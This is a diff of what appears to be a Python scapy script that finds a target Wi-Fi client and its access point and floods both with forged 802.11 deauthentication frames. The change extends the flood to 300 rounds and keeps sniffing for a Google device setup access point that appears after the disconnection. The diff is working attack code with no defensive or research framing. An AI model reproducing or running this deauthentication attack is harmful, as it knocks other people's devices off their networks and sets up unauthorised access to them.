@@ -62,17 +62,9 @@ def main(interface):
 	print("FOUND MATCHING CLIENT: ", end="")
 	pprint.PrettyPrinter().pprint(matching_client)
 
-	print("Waiting to detect matching AP beacon")
-	while not matching_client["AP MAC"] in wireless_access_points:
-		print(".", end="")
-
-		time.sleep(1)
-
-	print("FOUND MATCHING AP: ", end="")
-	pprint.PrettyPrinter().pprint(wireless_access_points[matching_client["AP MAC"]])
 	
-	worker_rotate_channel.terminate()
-	worker_sniff_wireless.terminate()
+	# worker_rotate_channel thread should have ended itself already
+	# We keep worker_sniff_wireless going so it can look for the new Google device setup AP
 
 
 	# Deauth the device
@@ -84,8 +76,8 @@ def main(interface):
 		Dot11(addr1=matching_client["AP MAC"], addr2=matching_client["CLIENT MAC"], addr3=matching_client["CLIENT MAC"])/
 		Dot11Deauth())
 
-	for i in range(30):
-		print(f"Send deauth #{i}...")
+	for i in range(60 * 5):
+		print(f"Send deauth #{i}...", flush=True)
 		sendp(deauth_pkt_for_ap, iface=interface)
 		sendp(deauth_pkt_for_client, iface=interface)
 
@@ -156,3 +148,4 @@ if "__main__" == __name__:
 	args = parser.parse_args()
 
 	main(**vars(args))
+
